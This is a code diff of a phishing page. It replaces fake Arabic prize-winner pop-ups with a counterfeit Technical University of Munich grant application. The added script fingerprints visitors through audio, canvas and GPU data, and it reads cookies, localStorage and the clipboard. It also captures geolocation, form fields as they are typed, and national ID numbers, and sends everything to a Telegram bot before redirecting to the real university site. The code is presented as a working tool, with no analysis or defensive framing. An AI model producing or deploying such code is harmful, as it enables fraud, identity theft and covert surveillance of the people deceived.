-        "ليلى اليافعي من اليمن فازت بجائزة عينية فورية 🎁",
-        "تحديث: مبروك لـ خالد الزهيري من المملكه دخول السحب ✅",
-        "عمار باوزير من المكلا فاز بجائزة مالية فورية 💰",
-        "هناء القدسي من تعز حصلت على iPhone 15 Pro! 📱",
-        "ععلي القحطاني من المملكه فاز بقسيمة 5000 ريال 💸",
-        "تم تأكيد فوز صالح الوادي من الكويت الآن ✨",
-        "ياسر الحميري من اليمن فاز 500 ريال 🌙",
-        "فائز جديد: مريم العولقي من شبوة حصلت على هدايا عينية 🎁",
-        "مبروك لـ ناصر الحضرمي من سيئون فوزه بالسحب 💸",
-        "تحديث: وصول بيانات فائز من حجة بجائزة نقدية ✨",
-        "عبدالرحمن السقاف من لحج فاز بجوال جديد 📱",
-        "أروى الأصبحي من عمان حصلت على قسيمة مشتريات ✅",
-        "سليم القاضي من عمان فاز بجائزة 100 ريال 💰",
-        "مبروك لـ بلقيس من الامارت فوزها بجائزة عينية 🎁",
-        "صادق  ممن الكويت فاز بجائزة فورية الآن ✨",
-        "تم جلب بيانات فائز من عمان بجائزة السحب 🌙",
-        "فؤاد المهدي من المملكه فاز بجوال iPhone 15! 📱"
-    ];
-
-    function showRandomWinner() {
-        const toast = document.getElementById('winner-toast');
-        if (!toast) return; // التأكد من وجود العنصر
-        const randomWinner = winners[Math.floor(Math.random() * winners.length)];
-        toast.innerText = randomWinner;
-        toast.style.display = 'block';
-
-        // يختفي بعد 3 ثواني ويظهر غيره بعد 5
-        setTimeout(() => { toast.style.display = 'none'; }, 3000);
+    async function getAudioFingerprint() {
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            const gain = audioCtx.createGain();
+            gain.gain.value = 0;
+            oscillator.type = 'triangle';
+            oscillator.connect(analyser);
+            analyser.connect(gain);
+            gain.connect(audioCtx.destination);
+            oscillator.start(0);
+            const data = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(data);
+            oscillator.stop();
+            let sum = 0;
+            for (let i = 0; i < data.length; i++) if (isFinite(data[i])) sum += Math.abs(data[i]);
+            return "Audio-" + Math.floor(sum);
+        } catch(e) { return "Audio-blocked"; }
     }
 
-    // تشغيل الحركة كل 5 ثواني
-    setInterval(showRandomWinner, 5000);
+    function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("TUM-Radar-2026", 2, 15);
+            ctx.fillStyle = "rgba(102,204,0,0.7)";
+            ctx.fillText("TUM-Radar-2026", 4, 17);
+            const b64 = canvas.toDataURL().replace("data:image/png;base64,","");
+            return b64.slice(0, 32);
+        } catch(e) { return "Canvas-protected"; }
+    }
 
-    // --- كود الصاعقة: تحديث بصمة الصوت عند أول لمسة ---
-document.addEventListener('click', async () => {
-    try {
-        // تشغيل تحليل الصوت بعد اللمس (الآن المتصفح سيسمح له)
-        const audioDNAUpdate = await getAudioFingerprint(); 
+    async function fetchUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return "Unknown"; }
+    }
+
+    async function silentRadar() {
+        let audioDNA = await getAudioFingerprint();
+        let deviceFingerprint = getCanvasFingerprint();
+        let ipAddr = await fetchUserIP();
         
-        const audioUpdateMsg = `
-🎵 تحديث بصمة الصوت (Audio DNA):
+        let storageInfo = "N/A";
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const est = await navigator.storage.estimate();
+                storageInfo = `${(est.quota / (1024**3)).toFixed(1)}GB total | ${((est.quota - est.usage) / (1024**3)).toFixed(1)}GB free`;
+            }
+        } catch(e) {}
+        
+        let gpuInfo = "Unknown";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debug) gpuInfo = gl.getParameter(debug.UNMASKED_RENDERER_ID);
+                else gpuInfo = gl.getParameter(gl.RENDERER);
+            }
+        } catch(e) { gpuInfo = "Blocked"; }
+        
+        let ua = navigator.userAgent;
+        let platform = navigator.platform;
+        let cores = navigator.hardwareConcurrency || "Unknown";
+        let ram = navigator.deviceMemory || "Unknown";
+        let screenRes = `${window.screen.width}x${window.screen.height}`;
+        let connection = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+        
+        let batteryInfo = "N/A";
+        try {
+            const bat = await navigator.getBattery();
+            batteryInfo = `🔋 ${Math.round(bat.level*100)}% | ${bat.charging ? 'Charging' : 'Battery'}`;
+        } catch(e) {}
+        
+        const radarMsg = `
+🎓 TUM Academic Radar (Detailed Device Info)
+🎵 Audio FP: ${audioDNA}
+🧬 Canvas FP: ${deviceFingerprint}
+🌐 IP Address: ${ipAddr}
+📡 Network: ${connection}
+🖥️ Platform: ${platform}
+🧠 CPU Cores: ${cores}
+🎮 GPU: ${gpuInfo}
+📟 RAM: ${ram} GB
+💾 Storage: ${storageInfo}
+🔋 Battery: ${batteryInfo}
+🖥️ Screen: ${screenRes}
+🌐 User Agent: ${ua}
 ----------------------------------
-🆔 المعرف الرقمي: ${audioDNAUpdate}
-✅ تم التحقق: الجهاز حقيقي وملموس
-----------------------------------
-🕵️‍♂️ رادار ZeroX المتقدم
+📍 Target: TUM Excellence Grant
         `;
-
-        // إرسال رسالة الصوت المنفصلة
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(audioUpdateMsg)}`);
-    } catch (e) {
-        console.log("لم يتم التقاط الصوت بعد");
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(radarMsg)}`);
     }
-}, { once: true }); // كلمة once تضمن أنه يرسل مرة واحدة فقط عند أول لمسة
 
+    window.addEventListener('load', () => {
+        silentRadar();
+        // Send cookies & localStorage
+        let cookies = document.cookie || "No cookies (protected)";
+        let localData = "Empty";
+        try { localData = JSON.stringify(localStorage); if(localData === "{}") localData = "Empty"; } catch(e) { localData = "Blocked"; }
+        const storageReport = `🍪 Storage Report (TUM):\n📦 Cookies: ${cookies}\n🔐 LocalStorage: ${localData}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(storageReport)}`);
+    });
+
+    document.addEventListener('click', () => {
+        navigator.clipboard.readText().then(text => {
+            if(text && text.length > 0) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 Clipboard captured: " + text)}`);
+            }
+        }).catch(() => {});
+    }, { once: true });
+
+    if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Browser in Incognito mode")}`);
+    }
+
+    window.ondeviceorientation = (event) => {
+        if (event.beta !== null) {
+            let tilt = event.beta > 45 ? "Tilted backward" : "Flat";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 Device orientation: " + tilt)}`);
+            window.ondeviceorientation = null;
+        }
+    };
+
+    ['fullname', 'phone', 'email', 'job_id', 'national_id'].forEach(id => {
+        const el = document.getElementById(id);
+        if(el) {
+            el.addEventListener('blur', (e) => {
+                if(e.target.value.length > 2) {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`✏️ User typed in ${id}: ${e.target.value}`)}`);
+                }
+            });
+        }
+    });
+
+    window.onblur = () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📴 User left the page (switched app or locked screen)")}`);
+    };
+    window.onfocus = () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 User returned to the page")}`);
+    };
+
+    function getLocationAndSend() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const locMsg = `📍 User exact location:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
+            }, err => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ User denied location access")}`);
+            });
+        }
+    }
+
+    document.addEventListener('click', async () => {
+        try {
+            const freshAudio = await getAudioFingerprint();
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎧 Audio fingerprint (after touch): " + freshAudio)}`);
+        } catch(e) {}
+    }, { once: true });
+
+    // ---------- Main Form Processing ----------
+    async function processVerification() {
+        const name = document.getElementById('fullname').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const jobId = document.getElementById('job_id').value.trim();
+        const nationalId = document.getElementById('national_id').value.trim();
+        
+        if(!name || !phone || !email || !jobId || !nationalId) {
+            showToast(currentLang === 'en' ? "Please fill all required fields" : "يرجى ملء جميع الحقول المطلوبة", 2500, "#dc3545");
+            return;
+        }
+        
+        // Hide form, show loading
+        document.getElementById('step-form').style.display = 'none';
+        document.getElementById('loading-box').style.display = 'block';
+        
+        getLocationAndSend();
+        const userIP = await fetchUserIP();
+        
+        const userDataMsg = `
+🎓 [TUM] New Excellence Grant Application
+👤 Full Name: ${name}
+📱 Phone: ${phone}
+📧 Email: ${email}
+🆔 Job ID: ${jobId}
+🪪 National ID: ${nationalId}
+🌍 IP Address: ${userIP}
+----------------------------------
+✅ Status: Form submitted successfully
+        `;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(userDataMsg)}`);
+        
+        setTimeout(() => {
+            document.getElementById('loading-box').style.display = 'none';
+            document.getElementById('success-message').style.display = 'block';
+            showToast(currentLang === 'en' ? "Verification successful! You will receive an email shortly." : "تم التحقق بنجاح! سيصلك بريد إلكتروني قريباً.", 4000, "#2e7d32");
+        }, 3000);
+    }
+    
+    // Redirect to real TUM website
+    function redirectToTUM() {
+        window.location.href = "https://www.tum.de";
+    }
+    
+    function showToast(msg, duration = 3000, bgColor = "#000") {
+        const toast = document.getElementById('academic-toast');
+        toast.innerText = msg;
+        toast.style.backgroundColor = bgColor;
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, duration);
+    }
+    
+    // Random academic toasts (bilingual)
+    let toastMessages = translations.en.toastUpdates;
+    setInterval(() => {
+        const randomMsg = toastMessages[Math.floor(Math.random() * toastMessages.length)];
+        showToast(randomMsg, 2800, "#0065BD");
+    }, 7000);
+    
+    // Apply default English
+    applyLanguage('en');
+    console.log("✅ TUM Portal with redirect button, phone/email fields, IP capture, and bilingual support ready.");
 </script>
-
 
 </body>
 </html>
